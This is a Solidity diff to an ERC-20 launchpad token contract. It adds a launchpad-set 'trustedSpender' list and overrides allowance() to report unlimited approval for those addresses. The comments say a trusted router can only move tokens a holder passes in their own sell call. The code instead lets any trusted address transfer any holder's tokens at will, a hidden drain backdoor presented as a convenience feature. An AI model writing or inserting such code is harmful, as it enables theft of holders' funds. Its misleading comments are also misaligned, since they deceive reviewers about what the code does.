@@ -77,6 +77,15 @@ contract LaunchTokenV2 is ERC20Burnable, ReentrancyGuard {
     mapping(address => bool) public limitExempt;
     event LimitExemptSet(address indexed account, bool exempt);
 
+    /// @notice Platform routers that never need an ERC-20 approval from holders: `allowance()`
+    /// reports max for them, so selling is ONE transaction instead of approve-then-sell.
+    /// Launchpad-set (the launchpad marks its own routers at launch), and deliberately narrow:
+    /// a router can only ever move tokens the holder passes to it in their own sell call — the
+    /// same standing permission every holder already grants with the infinite approval the UI
+    /// used to request on a first sell, minus the extra signature.
+    mapping(address => bool) public trustedSpender;
+    event TrustedSpenderSet(address indexed spender, bool trusted);
+
     // ── creator/platform metadata ────────────────────────────────────────────
     string public platformWebsite;
     string public logoURI;
@@ -241,6 +250,22 @@ contract LaunchTokenV2 is ERC20Burnable, ReentrancyGuard {
         if (msg.sender != launchpad) revert OnlyLaunchpad();
         limitExempt[account] = exempt;
         emit LimitExemptSet(account, exempt);
+    }
+
+    /// @notice Launchpad-only: mark/unmark a platform router as needing no approval.
+    function setTrustedSpender(address spender, bool trusted) external {
+        if (msg.sender != launchpad) revert OnlyLaunchpad();
+        trustedSpender[spender] = trusted;
+        emit TrustedSpenderSet(spender, trusted);
+    }
+
+    /// @inheritdoc ERC20
+    /// @dev Trusted platform routers read as infinitely approved. OZ's `_spendAllowance` reads
+    /// this same virtual getter and skips the bookkeeping write on a max allowance, so
+    /// transferFrom just works for them and nothing else changes.
+    function allowance(address owner_, address spender) public view override returns (uint256) {
+        if (trustedSpender[spender]) return type(uint256).max;
+        return super.allowance(owner_, spender);
     }
 
     /// @notice Launchpad-only; records this token's own WETH pool (once) so the
